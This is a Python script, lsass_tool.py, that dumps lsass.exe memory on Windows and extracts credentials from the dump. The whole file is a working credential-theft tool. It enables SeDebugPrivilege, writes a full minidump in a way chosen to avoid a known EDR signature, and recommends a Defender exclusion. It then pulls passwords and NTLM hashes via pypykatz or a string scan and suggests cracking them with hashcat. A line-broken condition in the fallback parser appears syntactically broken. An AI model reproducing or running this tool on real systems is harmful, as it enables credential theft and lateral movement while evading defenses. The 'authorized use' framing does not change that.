#!/usr/bin/env python3
"""
lsass_tool.py -- Single-file utility for authorized Windows incident response /
red-team practice on hosts you own.

Two functions, run separately (or together) from an elevated (Administrator)
context:

  1. DUMP  : Opens lsass.exe with SeDebugPrivilege and writes a full-memory
             minidump via dbghelp.dll!MiniDumpWriteDump (the same core call
             used by comsvcs.dll, MiniDump, but without shelling out to
             rundll32, which is a well-known AV/EDR signature).

  2. PARSE : Offline parsing of the dump for credential material.
             - Primary path: uses pypykatz if installed (`pip install pypykatz`)
               for full Mimikatz-style extraction (MSV, WDigest, Kerberos,
               DPAPI, LSASS secrets, hashes).
             - Fallback path (no pypykatz): a naive UTF-16LE string scanner
               that surfaces candidate cleartext credentials (useful for
               WDigest-style plaintext in memory). The fallback is heuristic,
               not a true credential parser.

Usage:
    python lsass_tool.py dump                      # dump lsass to lsass.dmp
    python lsass_tool.py dump -o C:\\temp\\out.dmp  # specify output path
    python lsass_tool.py dump --parse             # dump then parse immediately
    python lsass_tool.py parse lsass.dmp          # parse an existing dump

Notes:
    * Dumping LSASS memory is flagged by most EDR products. If Defender is
      enabled, add an exclusion or run in an environment where this is allowed.
    * Run as Administrator (SeDebugPrivilege required).
    * Python 3.7+ on Windows. ctypes only for the dump; parsing is stdlib
      unless pypykatz is available.
"""

import argparse
import ctypes
import ctypes.wintypes as wt
import os
import re
import struct
import sys

# ---------------------------------------------------------------------------
# Win32 constants
# ---------------------------------------------------------------------------

PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010

TOKEN_QUERY = 0x0008
TOKEN_ADJUST_PRIVILEGES = 0x0020

SE_PRIVILEGE_ENABLED = 0x0002

MiniDumpWithFullMemory = 0x00000002

GENERIC_WRITE = 0x40000000
FILE_SHARE_READ = 0x00000001
CREATE_ALWAYS = 2
FILE_ATTRIBUTE_NORMAL = 0x80

INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value

# ---------------------------------------------------------------------------
# Win32 structures
# ---------------------------------------------------------------------------

class LUID(ctypes.Structure):
    _fields_ = [("LowPart", wt.DWORD),
                ("HighPart", wt.LONG)]


class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [("PrivilegeCount", wt.DWORD),
                ("Luid", LUID),
                ("Attributes", wt.DWORD)]


kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
dbghelp = ctypes.WinDLL("dbghelp", use_last_error=True)
advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)

# ---------------------------------------------------------------------------
# Win32 prototypes
# ---------------------------------------------------------------------------

kernel32.OpenProcess.restype = wt.HANDLE
kernel32.OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]

kernel32.CreateFileW.restype = wt.HANDLE
kernel32.CreateFileW.argtypes = [wt.LPCWSTR, wt.DWORD, wt.DWORD,
                                ctypes.c_void_p, wt.DWORD, wt.DWORD, wt.HANDLE]

kernel32.GetCurrentProcess.restype = wt.HANDLE
kernel32.GetCurrentProcess.argtypes = []

advapi32.OpenProcessToken.restype = wt.BOOL
advapi32.OpenProcessToken.argtypes = [wt.HANDLE, wt.DWORD, ctypes.POINTER(wt.HANDLE)]

advapi32.LookupPrivilegeValueW.restype = wt.BOOL
advapi32.LookupPrivilegeValueW.argtypes = [wt.LPCWSTR, wt.LPCWSTR,
                                           ctypes.POINTER(LUID)]

advapi32.AdjustTokenPrivileges.restype = wt.BOOL
advapi32.AdjustTokenPrivileges.argtypes = [wt.HANDLE, wt.BOOL,
                                           ctypes.POINTER(TOKEN_PRIVILEGES),
                                           wt.DWORD, ctypes.c_void_p, ctypes.c_void_p]

dbghelp.MiniDumpWriteDump.restype = wt.BOOL
dbghelp.MiniDumpWriteDump.argtypes = [wt.HANDLE, wt.DWORD, wt.HANDLE, wt.DWORD,
                                      ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p]

kernel32.CloseHandle.argtypes = [wt.HANDLE]


def _winerr(msg):
    err = ctypes.get_last_error()
    raise OSError("%s (Windows error %d)" % (msg, err))


# ---------------------------------------------------------------------------
# Dump logic
# ---------------------------------------------------------------------------

def enable_se_debug_privilege():
    """Enable SeDebugPrivilege in our own process token."""
    h_token = wt.HANDLE()
    if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(),
                                     TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
                                     ctypes.byref(h_token)):
        _winerr("OpenProcessToken failed")

    luid = LUID()
    if not advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid)):
        kernel32.CloseHandle(h_token)
        _winerr("LookupPrivilegeValueW failed")

    tp = TOKEN_PRIVILEGES()
    tp.PrivilegeCount = 1
    tp.Luid = luid
    tp.Attributes = SE_PRIVILEGE_ENABLED

    if not advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(tp),
                                          0, None, None):
        kernel32.CloseHandle(h_token)
        _winerr("AdjustTokenPrivileges failed")
    kernel32.CloseHandle(h_token)

    # AdjustTokenPrivileges can succeed but still fail to assign; check via
    # GetLastError == ERROR_NOT_ALL_ASSIGNED (1300).
    if ctypes.get_last_error() == 1300:
        raise OSError("Could not assign SeDebugPrivilege; run as Administrator.")


def create_toolhelp_snapshot_and_find_lsass():
    """Find the PID of lsass.exe via the toolhelp32 snapshot API (no psutil).."""
    TH32CS_SNAPPROCESS = 0x00000002

    class PROCESSENTRY32W(ctypes.Structure):
        _fields_ = [("dwSize", wt.DWORD),
                    ("cntUsage", wt.DWORD),
                    ("th32ProcessID", wt.DWORD),
                    ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                    ("th32ModuleID", wt.DWORD),
                    ("cntThreads", wt.DWORD),
                    ("th32ParentProcessID", wt.DWORD),
                    ("pcPriClassBase", ctypes.c_long),
                    ("dwFlags", wt.DWORD),
                    ("szExeFile", wt.WCHAR * 260)]

    CreateToolhelp32Snapshot = kernel32.CreateToolhelp32Snapshot
    CreateToolhelp32Snapshot.restype = wt.HANDLE
    CreateToolhelp32Snapshot.argtypes = [wt.DWORD, wt.DWORD]

    Process32FirstW = kernel32.Process32FirstW
    Process32FirstW.restype = wt.BOOL
    Process32FirstW.argtypes = [wt.HANDLE, ctypes.POINTER(PROCESSENTRY32W)]
    Process32NextW = kernel32.Process32NextW
    Process32NextW.restype = wt.BOOL
    Process32NextW.argtypes = [wt.HANDLE, ctypes.POINTER(PROCESSENTRY32W)]

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap in (None, INVALID_HANDLE_VALUE):
        _winerr("CreateToolhelp32Snapshot failed")

    entry = PROCESSENTRY32W()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32W)
    pid = None
    try:
        ok = Process32FirstW(snap, ctypes.byref(entry))
        while ok:
            if entry.szExeFile.lower() == "lsass.exe":
                pid = entry.th32ProcessID
                break
            ok = Process32NextW(snap, ctypes.byref(entry))
    finally:
        kernel32.CloseHandle(snap)

    if pid is None:
        raise RuntimeError("lsass.exe not found in process list.")
    return pid


def dump_lsass(out_path):
    """Dump lsass.exe full memory to out_path. Returns the PID dumped."""
    if os.name != "nt":
        raise RuntimeError("Dumping LSASS requires Windows.")

    enable_se_debug_privilege()
    pid = create_toolhelp_snapshot_and_find_lsass()
    print("[*] lsass.exe PID: %d" % pid)

    h_process = kernel32.OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
    if not h_process or h_process == INVALID_HANDLE_VALUE:
        _winerr("OpenProcess(lsass) failed")

    out_path = os.path.abspath(out_path)
    h_file = kernel32.CreateFileW(out_path, GENERIC_WRITE, FILE_SHARE_READ,
                                  None, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, None)
    if not h_file or h_file == INVALID_HANDLE_VALUE:
        kernel32.CloseHandle(h_process)
        _winerr("CreateFileW(%s) failed" % out_path)

    try:
        ok = dbghelp.MiniDumpWriteDump(h_process, pid, h_file,
                                       MiniDumpWithFullMemory,
                                       None, None, None)
    finally:
        kernel32.CloseHandle(h_file)
        kernel32.CloseHandle(h_process)

    if not ok:
        try:
            os.remove(out_path)
        except OSError:
            pass
        _winerr("MiniDumpWriteDump failed")

    size = os.path.getsize(out_path)
    print("[+] Dump written: %s (%d bytes)" % (out_path, size))
    return pid


# ---------------------------------------------------------------------------
# Parsing logic (offline)
# ---------------------------------------------------------------------------

def _try_pypykatz(dump_path):
    """Full parse via pypykatz if installed. Returns list of credential dicts."""
    from pypykatz.pypykatz import pypykatz  # lazy import

    mimi = pypykatz.parse_minidump_file(dump_path)
    creds = []
    for lsid, session in mimi.logon_sessions.items():
        for cred in session.creds:
            row = {
                "logon_session": str(lsid),
                "credtype": cred.credtype,
                "domain": cred.domain,
                "username": cred.username,
                "password": cred.password,
                "lmhash": cred.lmhash,
                "nthash": cred.nthash,
                "sha1": cred.sha1,
                "key_guid": cred.key_guid,
            }
            creds.append(row)
    return creds


def _scan_utf16_strings(dump_path, min_len=4):
    """Fallback: pull UTF-16LE printable strings out of the dump."""
    with open(dump_path, "rb") as f:
        data = f.read()

    # Match UTF-16LE runs of printable ASCII-range characters.
    pattern = (b"(?:[\x20-\x7e]\x00){%d,}" % min_len)
    strings = []
    for m in re.finditer(pattern, data):
        try:
            s = m.group().decode("utf-16-le")
            strings.append((m.start(), s))
        except UnicodeDecodeError:
            pass
    return strings


def _looks_like_username(s):
    return bool(re.match(r"^[A-Za-z0-9._\-]{2,32}$", s))


def _looks_like_password(s):
    # Heuristic: reasonable length, mix of character classes, not purely
    # machine-ish. Cleartext passwords (e.g. WDigest) often live near
    # their username, but without a parser we can only guess.
    if len(s) < 4 or len(s) > 64:
        return False
    if s.lower().startswith("windows"):
        return False
    classes = sum([bool(re.search(r"[a-z]", s)),
                   bool(re.search(r"[A-Z]", s)),
                   bool(re.search(r"[0-9]", s)),
                   bool(re.search(r"[^A-Za-z0-9]", s))])
    return classes >= 2


def _fallback_parse(dump_path):
    """
    Naive heuristic parse. Surfaces candidate usernames and possible
    cleartext secrets. Not a substitute for pypykatz/Mimikatz -- hashes,
    tickets, and DPAPI blobs are not decoded.
    """
    strings = _scan_utf16_strings(dump_path)
    creds = []

    # Collect candidate usernames (machine$ accounts and user-like names).
    usernames = set()
    for off, s in strings:
        if s.endswith("$") or _looks_like_username(s):
            if 2 <= len(s) <= 32 and s.lower() not in
            ("microsoft", "windows", "system32", "c:\\windows",
             "program", "powershell", "svchost", "services", "lsass",
             "runtime", "debug", "application"):
                usernames.add(s)

    print("[*] %d UTF-16 strings extracted; %d candidate account names."
          % (len(strings), len(usernames)))

    for name in sorted(usernames):
        creds.append({"credtype": "HEURISTIC-USERNAME",
                      "username": name,
                      "domain": "", "password": "", "lmhash": "",
                      "nthash": "", "sha1": "", "logon_session": ""})

    # Candidate plaintext secrets (heuristic).
    seen = set()
    for off, s in strings:
        if _looks_like_password(s) and s not in usernames and s not in seen:
            seen.add(s)
            creds.append({"credtype": "HEURISTIC-SECRET",
                          "username": "", "domain": "",
                          "password": s, "lmhash": "", "nthash": "",
                          "sha1": "", "logon_session": ""})
    return creds


def parse_dump(dump_path):
    print("[*] Parsing dump: %s" % dump_path)
    creds = None

    try:
        creds = _try_pypykatz(dump_path)
        print("[+] Parsed with pypykatz (full credential extraction).")
    except ImportError:
        print("[!] pypykatz not installed -- falling back to heuristic "
              "UTF-16 string scan. For real extraction: pip install pypykatz")
        creds = _fallback_parse(dump_path)
    except Exception as exc:
        print("[!] pypykatz parse failed (%s); falling back to heuristic scan."
              % exc)
        creds = _fallback_parse(dump_path)

    if not creds:
        print("[-] No credential material found.")
        return

    interesting = 0
    print("\n===== Credential Material =====")
    for c in creds:
        fields = []
        for key in ("logon_session", "credtype", "domain", "username",
                    "password", "lmhash", "nthash", "sha1"):
            val = (c.get(key) or "").strip()
            if val:
                fields.append("%s=%s" % (key, val))
        if not fields:
            continue
        interesting += 1
        print("  " + " | ".join(fields))
    print("==============================")
    print("[+] %d entries displayed." % interesting)
    print("[i] Suggested offline cracking of NTLM hashes: "
          "'hashcat -m 1000 hashes.txt rockyou.txt'")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Dump LSASS memory and parse it for credentials "
                    "(authorized use only).")
    sub = parser.add_subparsers(dest="cmd")

    p_dump = sub.add_parser("dump", help="Dump lsass.exe memory (requires "
                                          "an elevated shell).")
    p_dump.add_argument("-o", "--output", default="lsass.dmp",
                        help="Output dump path (default: lsass.dmp)")
    p_dump.add_argument("--parse", action="store_true",
                        help="Parse the dump immediately after writing it.")

    p_parse = sub.add_parser("parse", help="Parse an existing LSASS dump "
                                           "offline.")
    p_parse.add_argument("dumpfile", help="Path to the minidump file")

    args = parser.parse_args()

    if args.cmd == "dump":
        dump_lsass(args.output)
        if args.parse:
            parse_dump(args.output)
    elif args.cmd == "parse":
        if not os.path.isfile(args.dumpfile):
            print("[-] File not found: %s" % args.dumpfile)
            sys.exit(1)
        parse_dump(args.dumpfile)
    else:
        parser.print_help()
        sys.exit(1)


if __name__ == "__main__":
    main()
